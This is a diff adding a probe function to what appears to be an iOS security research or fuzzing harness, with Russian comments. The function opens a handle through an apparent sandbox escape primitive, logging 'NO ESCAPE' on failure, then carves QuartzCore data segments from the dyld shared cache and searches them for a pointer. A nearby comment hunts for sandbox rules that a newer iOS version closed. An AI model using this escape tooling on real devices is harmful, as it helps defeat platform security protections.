@@ -48166,6 +48166,135 @@ static void p_bq116(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq117 — v276: карвинг DATA-сегментов iOS QuartzCore из dycache (§268).
+// 'functions\0' (@0x1847d9685, __TEXT) не имеет adrp-xref из __TEXT →
+// адресуется через CFString-константу в __AUTH_CONST (0x1e8d325a0+0x47df0).
+// Карвим все data-сегменты QC (адреса из load commands карва §268):
+//   __DATA_CONST 0x1e05ee5e0+0x1c488, __AUTH_CONST 0x1e8d325a0+0x47df0,
+//   __AUTH 0x1e7f940d0+0x1460, __DATA 0x1e4031840+0x63d0,
+//   __DATA_DIRTY 0x1e6e0f280+0x8810.
+// Механика p_pprp: пересечения [vm, vm+sz) со всеми маппингами всех сабфайлов.
+static void p_bq117(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq117] v276: карвинг data-сегментов QC iOS (§268)");
+    fsync(fileno(stderr));
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq117] CONTROL §170 -> handle %lld%s", (long long)h,
+        h < 0 ? " *** NO ESCAPE ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) return;
+
+    const char *candirs[] = {
+        "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld",
+        "/System/Library/Caches/com.apple.dyld",
+        "/System/Library/dyld",
+        "/private/var/db/dyld",
+    };
+    char cdir[1024] = {0};
+    for (unsigned i = 0; i < sizeof(candirs)/sizeof(candirs[0]) && !cdir[0]; i++) {
+        DIR *pd = opendir(candirs[i]);
+        if (!pd) continue;
+        struct dirent *pe;
+        while ((pe = readdir(pd)))
+            if (strstr(pe->d_name, "dyld_shared_cache_arm64e")) {
+                snprintf(cdir, sizeof(cdir), "%s", candirs[i]); break;
+            }
+        closedir(pd);
+    }
+    if (!cdir[0]) { LOG("[bq117] кэш-каталог не найден"); bad_query_release(h); return; }
+
+    NSMutableArray *subs = [NSMutableArray array];
+    DIR *cd = opendir(cdir);
+    struct dirent *ce;
+    while (cd && (ce = readdir(cd))) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, ".symbols")) continue;
+        if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+        char p[1400];
+        snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+        struct stat st;
+        if (stat(p, &st) == 0 && S_ISREG(st.st_mode))
+            [subs addObject:[NSString stringWithUTF8String:p]];
+    }
+    if (cd) closedir(cd);
+    LOG("[bq117] %d сабфайлов", (int)subs.count);
+
+    static const struct { uint64_t vm; uint64_t sz; const char *name; } ranges[] = {
+        { 0x1e05ee5e0ULL, 0x1c488ULL,  "qc-DATA_CONST" },
+        { 0x1e8d325a0ULL, 0x47df0ULL,  "qc-AUTH_CONST" },
+        { 0x1e7f940d0ULL, 0x1460ULL,   "qc-AUTH" },
+        { 0x1e4031840ULL, 0x63d0ULL,   "qc-DATA" },
+        { 0x1e6e0f280ULL, 0x8810ULL,   "qc-DATA_DIRTY" },
+    };
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    for (unsigned t = 0; t < sizeof(ranges)/sizeof(ranges[0]); t++) {
+        uint64_t addr = ranges[t].vm, want = ranges[t].sz;
+        unsigned char *buf = (unsigned char *)calloc(1, (size_t)want);
+        uint64_t filled = 0;
+        for (NSString *sf in subs) {
+            int sfd = open(sf.fileSystemRepresentation, O_RDONLY);
+            if (sfd < 0) continue;
+            struct bq14_cache_header sh = {0};
+            if (pread(sfd, &sh, sizeof(sh), 0) != sizeof(sh) ||
+                memcmp(sh.magic, "dyld_v1", 7) != 0 ||
+                sh.mappingCount > 64 || sh.mappingOffset > (1u << 20)) {
+                close(sfd); continue;
+            }
+            struct bq14_mapping_info mm[64];
+            memset(mm, 0, sizeof(mm));
+            if (pread(sfd, mm, sh.mappingCount * sizeof(struct bq14_mapping_info),
+                      sh.mappingOffset) !=
+                (ssize_t)(sh.mappingCount * sizeof(struct bq14_mapping_info))) {
+                close(sfd); continue;
+            }
+            for (uint32_t m = 0; m < sh.mappingCount; m++) {
+                uint64_t ma = mm[m].address, msz = mm[m].size,
+                         mfo = mm[m].fileOffset;
+                if (ma + msz <= addr || ma >= addr + want) continue;
+                uint64_t i0 = (ma > addr) ? ma : addr;
+                uint64_t i1 = (ma + msz < addr + want) ? ma + msz : addr + want;
+                if (i1 <= i0) continue;
+                uint64_t rel = i0 - addr, chunk = i1 - i0;
+                unsigned char *tmp = (unsigned char *)malloc((size_t)chunk);
+                ssize_t got = pread(sfd, tmp, (size_t)chunk,
+                                    (off_t)(mfo + (i0 - ma)));
+                if (got == (ssize_t)chunk) {
+                    memcpy(buf + rel, tmp, (size_t)chunk);
+                    filled += chunk;
+                }
+                free(tmp);
+            }
+            close(sfd);
+        }
+        LOG("[bq117] %s: filled %llu/%llu", ranges[t].name,
+            (unsigned long long)filled, (unsigned long long)want);
+        // needle: указатель на 'functions\0' (0x1847d9685) внутри данных?
+        uint64_t want_ptr = 0x1847d9685ULL;
+        for (uint64_t o = 0; o + 8 <= want; o += 8) {
+            uint64_t v;
+            memcpy(&v, buf + o, 8);
+            if (v == want_ptr) {
+                LOG("[bq117]   PTR на 'functions' @%s+0x%llx *** FOUND ***",
+                    ranges[t].name, (unsigned long long)o);
+            }
+        }
+        NSString *out = [docs stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"carve-%s.bin", ranges[t].name]];
+        FILE *o = fopen(out.fileSystemRepresentation, "wb");
+        if (o) { fwrite(buf, 1, (size_t)want, o); fclose(o);
+            LOG("[bq117]   saved %llu -> carve-%s.bin", (unsigned long long)want,
+                ranges[t].name); }
+        free(buf);
+        fsync(fileno(stderr));
+    }
+    bad_query_release(h);
+    LOG("[bq117] ИТОГ: data-сегменты QC вырезаны");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -56796,6 +56925,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ114")) { p_bq114(); LOG("[probe13] bq114-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ115")) { p_bq115(); LOG("[probe13] bq115-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ116")) { p_bq116(); LOG("[probe13] bq116-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ117")) { p_bq117(); LOG("[probe13] bq117-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
